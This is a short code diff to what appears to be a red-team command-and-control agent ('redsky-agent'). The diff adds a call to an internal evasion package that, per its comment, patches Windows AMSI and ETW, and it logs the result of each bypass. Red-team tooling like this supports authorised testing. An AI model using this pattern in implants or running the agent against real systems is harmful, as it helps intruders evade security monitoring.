@@ -27,6 +27,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
+	"github.com/sk666G/red-sky---arsenal/internal/evade"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
@@ -51,6 +52,15 @@ func main() {
 	}
 
 	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)
+
+	// Defense evasion: patch AMSI/ETW on Windows. No-op on Linux/macOS.
+	for _, r := range evade.Init() {
+		if r.Applied {
+			log.Printf("evade: [ok] %s — %s", r.Name, r.Detail)
+		} else {
+			log.Printf("evade: [--] %s — %s", r.Name, r.Detail)
+		}
+	}
 
 	for {
 		if err := runSession(*host, *port, agentID, *caFP, *beaconSec); err != nil {
